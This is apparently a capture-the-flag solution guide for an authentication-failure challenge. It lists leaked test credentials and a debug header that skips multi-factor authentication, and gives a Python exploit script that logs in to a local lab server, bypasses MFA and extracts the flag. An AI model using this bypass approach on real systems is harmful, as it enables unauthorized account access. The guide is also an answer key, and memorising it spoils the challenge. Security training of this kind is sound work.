# A07 Medium: Solution Guide

### Vulnerability Analysis
1. Inspect `/services` to find the developer release note mentioning test account `sysadmin_root` and password `AutumnSettlement#99`.
2. Inspect `/static/js/auth-flow.js` to observe the developer comment:
   `// API Reference: /api/v1/auth/session/upgrade with header 'X-SecOps-Internal: 1' or payload param 'bypass_mfa_reason'`
3. Submit initial credentials to `/login`:
   - `username: sysadmin_root`
   - `password: AutumnSettlement#99`
4. The server redirects to `/auth/2fa`.
5. Execute the bypass by sending a POST request to `/api/v1/auth/session/upgrade` with header `X-SecOps-Internal: 1` or JSON `{"bypass_mfa_reason": "emergency_override"}` within the active session.
   Alternatively, submit POST to `/auth/2fa` with header `X-SecOps-Internal: 1` or form param `emergency_override=1`.
6. Access `/security/audit-vault` to obtain the dynamic flag.

### Exploit Script
```python
import requests
import re

BASE_URL = "http://127.0.0.1:6020"
s = requests.Session()

# 1. Step 1 Login
s.post(f"{BASE_URL}/login", data={
    "username": "sysadmin_root",
    "password": "AutumnSettlement#99"
})

# 2. MFA Bypass via SecOps header
resp = s.post(f"{BASE_URL}/api/v1/auth/session/upgrade", 
              headers={"X-SecOps-Internal": "1"}, 
              json={"bypass_mfa_reason": "emergency"})
assert resp.json().get("success") is True

# 3. Retrieve Flag
vault_resp = s.get(f"{BASE_URL}/security/audit-vault")
flag = re.search(r"RTSA\{[^}]+\}", vault_resp.text).group(0)
print(f"[+] Flag: {flag}")
```
